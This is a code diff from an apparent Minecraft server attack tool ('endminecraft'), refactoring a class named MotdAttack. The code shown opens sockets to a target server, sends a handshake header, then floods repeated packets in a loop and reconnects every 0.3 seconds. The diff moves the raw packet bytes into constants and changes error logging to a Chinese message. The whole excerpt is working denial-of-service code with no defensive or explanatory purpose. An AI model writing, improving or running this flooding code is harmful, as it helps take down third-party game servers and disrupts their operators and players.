@@ -1,5 +1,6 @@
 package me.alikomi.endminecraft.tasks.attack;
 
+import me.alikomi.endminecraft.utils.MinecraftPackets;
 import me.alikomi.endminecraft.utils.Util;
 
 import java.io.IOException;
@@ -50,14 +51,13 @@ public class MotdAttack extends Util {
                     try {
                         final Socket socket = new Socket();
                         socket.connect(new InetSocketAddress(ip, port));
-                        final byte[] head = new byte[]{0x07, 0x00, 0x04, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01};
                         if (socket.isConnected() && !socket.isClosed()) {
                             final OutputStream out = socket.getOutputStream();
-                            out.write(head);
+                            out.write(MinecraftPackets.MOTD_HEAD_PACK);
                             out.flush();
                             while (socket.isConnected() && !socket.isClosed() && isAttacking) {
                                 for (int i = 0; i < 10; i++) {
-                                    out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
+                                    out.write(MinecraftPackets.MOTD_ATTACK_PACK);
                                 }
                                 out.flush();
                             }
@@ -65,7 +65,7 @@ public class MotdAttack extends Util {
                         }
                         socket.close();
                     } catch (final Exception e) {
-                        e.printStackTrace();
+                        log("异常抛出！");
                     }
                     log("连接被断开，0.3秒后重新连接");
                 }
